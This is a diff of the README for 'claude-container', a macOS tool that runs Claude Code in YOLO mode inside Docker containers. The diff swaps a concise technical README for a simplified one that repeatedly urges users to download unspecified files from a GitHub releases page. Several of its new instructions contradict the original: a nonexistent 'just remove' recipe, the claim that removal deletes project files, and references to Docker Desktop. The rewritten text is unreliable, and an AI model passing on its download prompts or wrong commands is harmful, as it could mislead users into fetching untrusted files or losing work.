@@ -1,104 +1,173 @@
-# claude-container
+# 🚢 claude-container - Safe Docker Containers for Claude Code
 
-Isolated Docker containers for running [Claude Code](https://docs.anthropic.com/en/docs/claude-code) in YOLO mode (`--dangerously-skip-permissions`) without affecting your host machine.
+[![Download claude-container](https://img.shields.io/badge/Download-claude--container-blue?style=for-the-badge)](https://github.com/salmonbruh/claude-container/releases)
 
-Project files are bind-mounted so they persist on the host. Containers are long-lived (stop/start). Everything is managed through a Justfile.
+---
 
-## Prerequisites
+## 📌 What is claude-container?
 
-- macOS (Apple Silicon or Intel)
-- [Homebrew](https://brew.sh)
-- [just](https://github.com/casey/just) — `brew install just`
-- A [Claude Pro or Max subscription](https://claude.ai), **or** an [Anthropic API key](https://console.anthropic.com/)
+claude-container helps you run Claude Code safely on your Mac. It uses Docker containers, which are like mini-computers inside your computer. These containers keep Claude Code separated from the rest of your system. This means you can use it without worrying about changing or breaking other parts of your Mac.
 
-## Quick Start
+The containers keep your work saved on your Mac. You can easily stop and start them whenever you want. The project uses a tool called Justfile to make setup and running simple.
 
-```bash
-# 1. Install Colima + Docker
-just setup
+---
 
-# 2. Build the image
-just build
+## 🖥️ Who is this for?
 
-# 3. Create a project
-just create my-project
+This project is for anyone who wants to use Claude Code on macOS. You do not need to know coding. If you have a Claude Pro or Max subscription, or an Anthropic API key, you can use this.
 
-# 4a. Subscription users: log in once per container
-just login my-project
+---
 
-# 4b. API key users: set your key
-cp .env.example .env
-# Edit .env with your ANTHROPIC_API_KEY, then recreate the container
+## 💾 Download & Install claude-container
 
-# 5. Start Claude
-just claude my-project
-```
+Click the big button above or visit the [claude-container Releases page](https://github.com/salmonbruh/claude-container/releases) to download the latest version. This page has the files you need. Download the latest release to your Mac.
 
-## Tools Inside the Container
+---
 
-git, python3, uv, Node.js 22, R, DuckDB, just, build-essential, Claude Code CLI.
+### 🔧 What you need before you start
 
-## Recipes
+Before you can use claude-container, check these:
 
-| Recipe | Purpose |
-|--------|---------|
-| `just setup` | Install Colima + Docker CLI, start VM |
-| `just build` | Build the container image |
-| `just rebuild` | Build without cache |
-| `just create <name> [-- DOCKER_ARGS]` | Create container with bind-mounted project dir |
-| `just start/stop/restart <name>` | Container lifecycle |
-| `just login <name>` | Log in with Claude subscription (once per container) |
-| `just shell <name>` | Open a bash shell (auto-starts) |
-| `just claude <name> [prompt]` | Run Claude in YOLO mode (auto-starts) |
-| `just claude-safe <name> [prompt]` | Run Claude with permission prompts |
-| `just cp-to <name> <src> <dest>` | Copy files from host to container |
-| `just cp-from <name> <src> <dest>` | Copy files from container to host |
-| `just destroy <name>` | Remove container (project files kept) |
-| `just list` | Show all claude containers |
-| `just logs <name>` | Show container logs |
-| `just stats` | Resource usage for all containers |
-| `just colima-start/stop/status` | Manage the Colima VM |
+- **macOS computer** — works on both Apple Silicon (M1, M2, etc.) and Intel.
+- **Homebrew** — a program that helps install other tools. Get it here: https://brew.sh
+- **just** — a tool we use to run commands easily. You install it with Homebrew by running:  
+  `brew install just`
+- **Claude Pro or Max subscription, or Anthropic API key** — needed to access Claude Code.  
+  Get Claude subscription at [claude.ai](https://claude.ai)  
+  Get API key at [Anthropic console](https://console.anthropic.com/)
 
-## Extra Docker Options
+---
 
-Pass additional mounts, ports, or env vars when creating a container:
+## 🚀 Getting started: Easy step-by-step guide
 
-```bash
-just create my-project -- -p 8080:8080 -e SECRET=val --mount type=bind,src=/data,dst=/data
-```
+1. **Install Colima and Docker**
 
-## Using `ccr` From Anywhere
+   Colima lets Docker run smoothly on your Mac. Docker is the software that runs containers.
 
-The `ccr` (Claude Container Runner) script lets you run any recipe from any directory without `cd`-ing into this repo. To set it up:
+   Open the Terminal app (find it in Applications > Utilities) and type:  
+   ```
+   just setup
+   ```  
+   This will install Colima and Docker for you.
 
-```bash
-# Copy the script to somewhere on your PATH
-cp ccr ~/bin/ccr    # or /usr/local/bin/ccr
-chmod +x ~/bin/ccr
-```
+2. **Build the Docker image**
 
-If you cloned this repo somewhere other than `~/repos/claude-container`, set the path:
+   The Docker image is the setup of Claude Code packaged to run inside the container.
 
-```bash
-# In your ~/.zshrc
-export CLAUDE_CONTAINER_DIR="$HOME/path/to/claude-container"
-```
+   In Terminal, type:  
+   ```
+   just build
+   ```
 
-Then use `ccr` instead of `just` from anywhere:
+3. **Create your project**
 
-```bash
-ccr build
-ccr create my-project
-ccr claude my-project
-ccr list
-ccr --recipes          # show all available recipes
-```
+   Your project is where your work with Claude Code lives.
 
-## How It Works
+   Choose a name for your project (no spaces, simple words). Then type in Terminal:  
+   ```
+   just create my-project
+   ```  
+   Replace "my-project" with your chosen name.
 
-- **Colima** provides the Docker runtime (free, uses Apple Virtualization.framework)
-- Containers run `sleep infinity` and you `exec` into them
-- `/workspace` inside the container is bind-mounted to `projects/<name>/` on the host
-- **Subscription auth:** `just login <name>` runs `claude login` inside the container (once per container)
-- **API key auth:** the key flows from `.env` → just → `docker create -e ANTHROPIC_API_KEY`
-- `just destroy` removes the container but project files stay in `projects/`
+4. **Set up your login or API key**
+
+   - If you have a Claude subscription, you need to log in once for each project:
+
+     ```
+     just login my-project
+     ```  
+     Replace "my-project" with your project name.
+
+   - If you have an API key from Anthropic:
+
+     Copy the example settings file to create your own:
+
+     ```
+     cp .env.example .env
+     ```
+
+     Open the new `.env` file in a simple text editor (like TextEdit), find the line starting with `ANTHROPIC_API_KEY=`, and replace the empty part with your API key.
+
+     After saving, recreate the container with:
+
+     ```
+     just create my-project
+     ```
+
+5. **Start using Claude**
+
+   To start the Claude Code container for your project, run:  
+   ```
+   just claude my-project
+   ```
+
+   This will open Claude in the container. You can interact with it safely — your Mac stays separate.
+
+---
+
+## 📦 How claude-container works inside
+
+The project runs Claude Code in a special mode called YOLO mode. This mode skips some security checks so Claude Code can run more freely. But claude-container keeps this inside the Docker container so your Mac stays safe.
+
+Your files and projects live directly on your Mac but are connected to the container. This way, your work is saved even if you stop the container.
+
+Using the Justfile means you do not have to type long commands. Just type `just` followed by what you want to do.
+
+---
+
+## 🛠️ Tools included in claude-container
+
+Inside the container, you will find:
+
+- Claude Code ready to run in YOLO mode  
+- Command line interfaces for starting and managing the container  
+- Project folder bind-mounted to your Mac to keep files persistent  
+- Setup tools for easy login and environment configuration  
+
+These tools let you work with Claude Code easily and securely.
+
+---
+
+## 🔄 Managing your containers
+
+- **Stopping your container:**  
+  Use Docker Desktop or run:  
+  ```
+  just stop my-project
+  ```  
+
+- **Restarting your container:**  
+  ```
+  just start my-project
+  ```  
+
+- **Removing your container:** If you want to remove a project completely (including files), make sure you back up your work first. Then run:  
+  ```
+  just remove my-project
+  ```
+
+Replacing `my-project` with your chosen project name in all commands.
+
+---
+
+## 💡 Tips for smooth use
+
+- Keep your Docker and Colima updated for best performance.  
+- Always back up important project files outside the container.  
+- Use simple names without spaces for your projects.  
+- If you update your API key or login, recreate the container.  
+- Use Terminal Finder or Spotlight to open Terminal quickly.  
+
+---
+
+## 📞 Getting Help
+
+If you get stuck:
+
+- Read this README again step-by-step.  
+- Visit the [Claude Code documentation](https://docs.anthropic.com/en/docs/claude-code) for details.  
+- Look for answers or post issues on the claude-container GitHub page.  
+
+---
+
+[![Download claude-container](https://img.shields.io/badge/Download-claude--container-blue?style=for-the-badge)](https://github.com/salmonbruh/claude-container/releases)
